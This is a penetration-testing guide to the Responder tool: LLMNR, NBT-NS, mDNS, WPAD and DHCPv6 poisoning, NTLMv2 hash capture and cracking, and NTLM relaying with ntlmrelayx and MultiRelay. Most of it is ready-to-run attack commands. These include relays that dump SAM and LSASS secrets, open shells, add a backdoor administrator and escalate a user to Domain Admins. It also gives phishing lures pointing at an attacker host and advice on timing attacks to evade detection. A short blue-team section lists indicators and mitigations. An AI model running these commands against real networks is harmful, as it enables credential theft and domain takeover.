# Responder - Techniques and Attack Scenarios

This document covers advanced techniques, attack scenarios, and operational security considerations for using Responder in penetration testing engagements.

## Table of Contents

- [Protocol Poisoning Explained](#protocol-poisoning-explained)
  - [LLMNR Poisoning](#llmnr-poisoning)
  - [NBT-NS Poisoning](#nbt-ns-poisoning)
  - [mDNS Poisoning](#mdns-poisoning)
- [Capturing NTLMv2 Hashes](#capturing-ntlmv2-hashes)
- [WPAD Attacks](#wpad-attacks)
- [DHCPv6 Attacks](#dhcpv6-attacks)
- [Relay Attacks with ntlmrelayx](#relay-attacks-with-ntlmrelayx)
- [MultiRelay Usage](#multirelay-usage)
- [Practical Scenarios](#practical-scenarios)
  - [Basic Hash Capture](#scenario-1-basic-hash-capture)
  - [Responder + ntlmrelayx Combo](#scenario-2-responder--ntlmrelayx-combo)
  - [Targeting Specific Users](#scenario-3-targeting-specific-users)
  - [Analyzing Captured Hashes](#scenario-4-analyzing-captured-hashes)
  - [Cracking vs Relaying Decision](#scenario-5-cracking-vs-relaying-decision)
- [Stealth and OPSEC Considerations](#stealth-and-opsec-considerations)

---

## Protocol Poisoning Explained

Responder exploits Windows name resolution fallback behavior. When a Windows host cannot resolve a hostname via DNS, it falls back to multicast/broadcast protocols in this order:

1. **DNS** - Primary lookup (if configured)
2. **LLMNR** - Link-Local Multicast Name Resolution (UDP 5355)
3. **NBT-NS** - NetBIOS Name Service (UDP 137)
4. **mDNS** - Multicast DNS (UDP 5353)

### LLMNR Poisoning

**What it is:** LLMNR (Link-Local Multicast Name Resolution) is a protocol that allows hosts on the same subnet to resolve hostnames when DNS fails. It uses multicast address 224.0.0.252 on UDP port 5355.

**How the attack works:**

1. A Windows host tries to access `\\fileserver\share`
2. DNS lookup for "fileserver" fails (typo, non-existent, etc.)
3. Host sends LLMNR multicast query: "Who is fileserver?"
4. Responder answers: "I am fileserver, send traffic to me"
5. Victim connects to attacker's machine
6. Responder's fake SMB/HTTP server requests NTLM authentication
7. Victim sends NTLMv2 hash

```bash
# Enable LLMNR poisoning (enabled by default)
sudo responder -I eth0

# Watch for LLMNR queries
[*] [LLMNR]  Poisoned answer sent to 192.168.1.50 for name fileserver
```

### NBT-NS Poisoning

**What it is:** NBT-NS (NetBIOS Name Service) is an older Windows name resolution protocol operating on UDP port 137. It uses broadcast instead of multicast.

**Attack characteristics:**
- Broadcast-based (affects entire subnet)
- Older protocol, still enabled on most Windows systems
- Works when LLMNR fails or is disabled

```bash
# NBT-NS is enabled by default with Responder
sudo responder -I eth0

# Sample output
[*] [NBT-NS] Poisoned answer sent to 192.168.1.50 for name FILESRV (service: File Server)
```

### mDNS Poisoning

**What it is:** mDNS (Multicast DNS) is used for zero-configuration networking, commonly by Apple devices but also present in Windows. Uses multicast address 224.0.0.251 on UDP port 5353.

```bash
# mDNS poisoning is enabled by default
sudo responder -I eth0

# Sample output
[*] [MDNS] Poisoned answer sent to 192.168.1.50 for name printer.local
```

---

## Capturing NTLMv2 Hashes

When Responder poisons a name resolution request, the victim connects to Responder's rogue servers. These servers request NTLM authentication, capturing the hash.

### Hash Types

| Hash Type | Hashcat Mode | Description |
|-----------|--------------|-------------|
| NTLMv1 | 5500 | Older, weaker (DES-based) |
| NTLMv1-SSP | 5500 | With Session Security |
| NTLMv2 | 5600 | Current default, HMAC-MD5 based |
| NTLMv2-SSP | 5600 | With Extended Session Security |

### Hash Format

Captured NTLMv2 hashes are stored in John/Hashcat compatible format:

```
username::DOMAIN:challenge:NTProofStr:blob
```

Example:
```
admin::CORP:1122334455667788:A1B2C3D4E5F6...:0101000000000000...
```

### Where Hashes Are Stored

```bash
# Default locations
logs/SMB-NTLMv2-Client-192.168.1.50.txt
logs/HTTP-NTLMv2-192.168.1.50.txt
logs/Responder-Session.log

# SQLite database (configurable)
Responder.db
```

### Forcing Authentication

Different protocols trigger NTLM authentication:

```bash
# SMB authentication (most common)
# Victim types: \\attacker\share in Explorer

# HTTP/WPAD authentication
sudo responder -I eth0 -wP

# Force basic auth (cleartext)
sudo responder -I eth0 -b
```

---

## WPAD Attacks

**What it is:** WPAD (Web Proxy Auto-Discovery) allows browsers to automatically configure proxy settings. Windows clients query for `wpad.domain.local` via DNS, then fall back to LLMNR/NBT-NS.

### How WPAD Attacks Work

1. Browser queries DNS for `wpad.domain.local`
2. DNS fails (WPAD not configured in most environments)
3. Client falls back to LLMNR/NBT-NS for "wpad"
4. Responder answers, serves malicious `wpad.dat`
5. Browser uses attacker as proxy
6. Responder requests NTLM auth for proxy access

### WPAD Attack Commands

```bash
# Enable WPAD rogue proxy
sudo responder -I eth0 -w

# Force NTLM auth on proxy (highly effective)
sudo responder -I eth0 -wP

# Force auth on wpad.dat file retrieval
sudo responder -I eth0 -wF

# Maximum aggression (WPAD + proxy auth + wpad.dat auth)
sudo responder -I eth0 -wPF
```

### WPAD Configuration

In `Responder.conf`:
```ini
[HTTP Server]
; Serve a custom wpad.dat
WPADScript = function FindProxyForURL(url, host){return 'PROXY wpad:3141; DIRECT';}
```

### Why WPAD is Effective

- Browsers check WPAD automatically on startup
- Many organizations don't configure WPAD in DNS
- Works with all browsers (Edge, Chrome, Firefox with settings)
- Captures credentials from automated processes

---

## DHCPv6 Attacks

**What it is:** DHCPv6 attacks exploit the fact that Windows prefers IPv6 over IPv4. By becoming a rogue DHCPv6 server, an attacker can:

1. Assign an IPv6 address to targets
2. Set themselves as the DNS server
3. Redirect all DNS queries through the attacker

### DHCPv6 Attack with Responder

```bash
# Enable DHCPv6 broadcast answers with WPAD injection
sudo responder -I eth0 -d

# Combined with WPAD for maximum effectiveness
sudo responder -I eth0 -dwP
```

### mitm6 Integration

For more advanced DHCPv6 attacks, combine with `mitm6`:

```bash
# Terminal 1: Run mitm6
sudo mitm6 -d domain.local

# Terminal 2: Run Responder (or ntlmrelayx)
sudo responder -I eth0 -wP
```

**Note:** DHCPv6 attacks can be more stable than LLMNR/NBT-NS poisoning in modern environments.

---

## Relay Attacks with ntlmrelayx

Instead of capturing and cracking hashes, relay attacks forward the authentication to another target, executing commands as the victim user.

### Why Relay Instead of Capture?

- NTLMv2 hashes can be slow/impossible to crack
- Relay provides immediate access
- No password required
- Works against service accounts with complex passwords

### Prerequisites for Relay Attacks

1. **SMB Signing Disabled** on target (default on workstations)
2. **Target Different from Source** (can't relay to same machine)
3. **User Has Admin Rights** on target (for code execution)

### Check SMB Signing

```bash
# Using nmap
nmap --script smb2-security-mode -p 445 192.168.1.0/24

# Using netexec
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

### Setting Up ntlmrelayx

```bash
# Terminal 1: Start Responder WITHOUT SMB/HTTP servers
# Edit Responder.conf or use flags:
sudo responder -I eth0 -w

# In Responder.conf, disable conflicting servers:
# SMB = Off
# HTTP = Off

# Terminal 2: Start ntlmrelayx
# Basic relay with SAM dump
impacket-ntlmrelayx -tf targets.txt -smb2support

# Execute command on successful relay
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami > C:\temp\pwned.txt"

# Spawn interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Dump secrets
impacket-ntlmrelayx -tf targets.txt -smb2support --dump-lsass
```

### Relay to LDAP (AD Takeover)

```bash
# Relay to LDAP (create machine account, delegate access)
impacket-ntlmrelayx -t ldap://dc01.domain.local --delegate-access

# Add user to Domain Admins
impacket-ntlmrelayx -t ldap://dc01.domain.local --escalate-user hacker
```

### Relay to ADCS (ESC8)

```bash
# Relay to AD Certificate Services web enrollment
impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template User
```

---

## MultiRelay Usage

MultiRelay is Responder's built-in NTLM relay tool, an alternative to ntlmrelayx.

### Starting MultiRelay

```bash
# Navigate to Responder tools directory
cd /path/to/Responder/tools

# Run MultiRelay
python3 MultiRelay.py -t 192.168.1.100 -u ALL
```

### MultiRelay Options

| Option | Description |
|--------|-------------|
| `-t <target>` | Target machine to relay to |
| `-u ALL` | Relay all captured credentials |
| `-u <user>` | Only relay specific username |
| `-c <cmd>` | Command to execute on success |
| `-d` | Dump hashes (SAM) on success |

### MultiRelay Example Session

```bash
# Terminal 1: Run Responder (SMB server disabled)
sudo responder -I eth0 --disable-smb

# Terminal 2: Run MultiRelay
python3 MultiRelay.py -t 192.168.1.100 -u ALL -d

# When relay succeeds, MultiRelay dumps SAM hashes
[+] Relay succeeded! Dumping SAM...
Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Note:** ntlmrelayx is generally preferred over MultiRelay due to more features and active development.

---

## Practical Scenarios

### Scenario 1: Basic Hash Capture

**Objective:** Capture NTLMv2 hashes for offline cracking

**Setup:**
```bash
# Start Responder with verbose output
sudo responder -I eth0 -wPv
```

**What Triggers Hash Capture:**
- User types wrong share name: `\\fileservrr\share`
- User clicks phishing link: `file://attacker/share`
- Browser checks for WPAD on startup
- Scheduled tasks accessing non-existent shares

**Crack the Hash:**
```bash
# Using hashcat (GPU)
hashcat -m 5600 hashes.txt rockyou.txt -r rules/best64.rule

# Using john (CPU)
john --format=netntlmv2 --wordlist=rockyou.txt hashes.txt
```

### Scenario 2: Responder + ntlmrelayx Combo

**Objective:** Get shell access without cracking passwords

**Step 1: Identify relay targets**
```bash
# Find machines with SMB signing disabled
nxc smb 192.168.1.0/24 --gen-relay-list targets.txt
```

**Step 2: Configure Responder**
Edit `Responder.conf`:
```ini
SMB = Off
HTTP = Off
```

**Step 3: Start the attack**
```bash
# Terminal 1: Responder for poisoning
sudo responder -I eth0 -wPdv

# Terminal 2: ntlmrelayx for relaying
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Terminal 3: Monitor for shells
nc 127.0.0.1 11000  # Connect to spawned shell
```

**Step 4: Wait for authentication**

When a privileged user's credentials are relayed:
```
[*] SMBD-Thread-4: Received connection from 192.168.1.50
[*] Authenticating against 192.168.1.100 as CORP/admin SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

### Scenario 3: Targeting Specific Users

**Objective:** Only capture/relay specific high-value accounts

**Using Responder's filter:**
```bash
# Edit Responder.conf to filter
[HTTP Server]
; Only respond to requests from specific IPs
RespondTo = 192.168.1.50,192.168.1.51

[Responder Core]
; Don't respond to specific machines
DontRespondTo = 192.168.1.1,192.168.1.2
```

**Using ntlmrelayx user filter:**
```bash
# Only relay domain admin accounts
impacket-ntlmrelayx -tf targets.txt -smb2support -u administrator,admin,svc_admin
```

**Combining with Phishing:**
```bash
# Send targeted phishing link to specific user
# Link contains: file://attacker/share

# Responder captures hash when user clicks
[*] [SMB] NTLMv2-SSP Hash : target_user::CORP:...
```

### Scenario 4: Analyzing Captured Hashes

**Viewing captured hashes:**
```bash
# All captured hashes
cat logs/*NTLMv2*.txt

# Unique users
cat logs/*NTLMv2*.txt | cut -d: -f1 | sort -u

# Session log
cat logs/Responder-Session.log | grep NTLMv2
```

**Identify hash types:**
```bash
# NTLMv1 format (shorter)
user::DOMAIN:lmhash:nthash:challenge

# NTLMv2 format (longer blob)
user::DOMAIN:challenge:ntproofstr:blob
```

**Extract metadata:**
```bash
# Get unique domain names
cat logs/*NTLMv2*.txt | cut -d: -f3 | sort -u

# Get unique source IPs (from filenames)
ls logs/*NTLMv2*.txt | grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u
```

**Convert for hashcat:**
```bash
# Hashes are already in hashcat format
# Just combine all files
cat logs/*NTLMv2*.txt > all_hashes.txt
hashcat -m 5600 all_hashes.txt wordlist.txt
```

### Scenario 5: Cracking vs Relaying Decision

**Decision Framework:**

| Factor | Crack | Relay |
|--------|-------|-------|
| SMB signing on targets | Enabled | Disabled |
| Password complexity | Low/Medium | High/Unknown |
| Time constraints | More time | Need quick win |
| Target access needed | Any machine | Specific targets |
| Persistence needed | Yes (password reuse) | No |
| OPSEC sensitivity | Lower (offline) | Higher (active) |

**When to Crack:**
- All targets have SMB signing enabled
- You need long-term access/password reuse
- You have time and GPU resources
- Target uses common passwords

```bash
# Quick crack attempt
hashcat -m 5600 hash.txt rockyou.txt --force

# Rule-based attack
hashcat -m 5600 hash.txt company_words.txt -r /usr/share/hashcat/rules/best64.rule

# Hybrid attack (wordlist + mask)
hashcat -m 5600 hash.txt wordlist.txt -a 6 ?d?d?d?d
```

**When to Relay:**
- SMB signing disabled on targets
- Password complexity is high
- Need immediate shell access
- Service accounts (likely complex passwords)

```bash
# Quick relay setup
impacket-ntlmrelayx -tf targets.txt -smb2support -c "net user hacker Password123! /add && net localgroup Administrators hacker /add"
```

**Hybrid Approach:**
```bash
# Do both - capture for later, relay for now
# Responder.conf: HTTP = Off, SMB = Off

# Terminal 1: Responder captures to logs
sudo responder -I eth0 -wPdv

# Terminal 2: ntlmrelayx attempts relay AND saves hashes
impacket-ntlmrelayx -tf targets.txt -smb2support -of captured_hashes.txt
```

---

## Stealth and OPSEC Considerations

### Detection Vectors

| Activity | Detection Method |
|----------|------------------|
| LLMNR/NBT-NS poisoning | Network monitoring, Windows event logs |
| Multiple auth failures | Failed login events (4625) |
| SMB to unusual hosts | Firewall logs, network baselines |
| WPAD from non-standard server | Proxy logs, WPAD configuration monitoring |
| DHCPv6 rogue server | IPv6 monitoring, DHCP logs |

### Reducing Detection Risk

**1. Use Analyze Mode First**
```bash
# Passive reconnaissance - no poisoning
sudo responder -I eth0 -A

# Observe traffic patterns before attacking
```

**2. Limit Poisoning Scope**
```bash
# Only respond to specific targets (Responder.conf)
RespondTo = 192.168.1.50

# Exclude critical systems
DontRespondTo = 192.168.1.1,192.168.1.2
```

**3. Avoid Broadcasting**
```bash
# Use targeted poisoning instead of answering all queries
# Configure RespondTo in Responder.conf
```

**4. Clean Up Logs**
```bash
# Responder logs to:
logs/
Responder.db

# Consider operational security of log files
```

**5. Time Your Attacks**
- Run during business hours (more traffic to blend in)
- Avoid after-hours when traffic is suspicious
- Consider lunch/meeting times for reduced scrutiny

### Blue Team Indicators

**Network Indicators:**
- LLMNR/NBT-NS responses from non-Windows hosts
- High volume of LLMNR/NBT-NS traffic
- SMB connections to unexpected hosts
- WPAD responses from unknown servers

**Windows Event Logs:**
- Event ID 4625: Failed logins (may spike)
- Event ID 4648: Explicit credential use
- Event ID 4776: NTLM authentication attempts

**Defensive Mitigations:**
- Disable LLMNR: `GPO > Computer Config > Admin Templates > Network > DNS Client > Turn Off Multicast Name Resolution`
- Disable NBT-NS: `Network Adapter > Properties > TCP/IPv4 > Advanced > WINS > Disable NetBIOS over TCP/IP`
- Configure WPAD in DNS (prevents poisoning)
- Enable SMB signing on all systems
- Monitor for rogue DHCP/DHCPv6 servers

### OPSEC Best Practices

1. **Test in Lab First**: Understand your network footprint
2. **Coordinate with Blue Team**: If authorized, know monitoring capabilities
3. **Use Approved Infrastructure**: Don't run from personal machines
4. **Document Everything**: Timestamps, hashes captured, sources
5. **Minimize Exposure Time**: Run only as long as needed
6. **Consider Alternatives**: If environment is heavily monitored, consider other techniques

### Alternative Lower-OPSEC Approaches

```bash
# Instead of broad poisoning, consider:

# 1. Phishing with file:// links (targeted)
# Send link: file://your-responder-ip/share

# 2. SCF/URL file in writable shares (passive)
# Create .scf file pointing to Responder

# 3. HTML injection in web apps (targeted)
# <img src="\\attacker\image.png">

# 4. Printer/ADIDNS abuse (creative)
# Modify DNS records to point to attacker
```

---

## Quick Reference

### Essential Commands

```bash
# Basic poisoning
sudo responder -I eth0

# Full attack mode
sudo responder -I eth0 -wPdv

# Analyze mode (passive)
sudo responder -I eth0 -A

# With relay (disable SMB/HTTP first)
sudo responder -I eth0 -wPd  # + ntlmrelayx in another terminal
```

### Hash Cracking Reference

```bash
# NTLMv2 - hashcat
hashcat -m 5600 hash.txt wordlist.txt

# NTLMv2 - john
john --format=netntlmv2 hash.txt

# NTLMv1 - hashcat (if lucky)
hashcat -m 5500 hash.txt wordlist.txt
```

### Log Locations

```
logs/SMB-NTLMv2-Client-<IP>.txt
logs/HTTP-NTLMv2-<IP>.txt
logs/Responder-Session.log
Responder.db
```
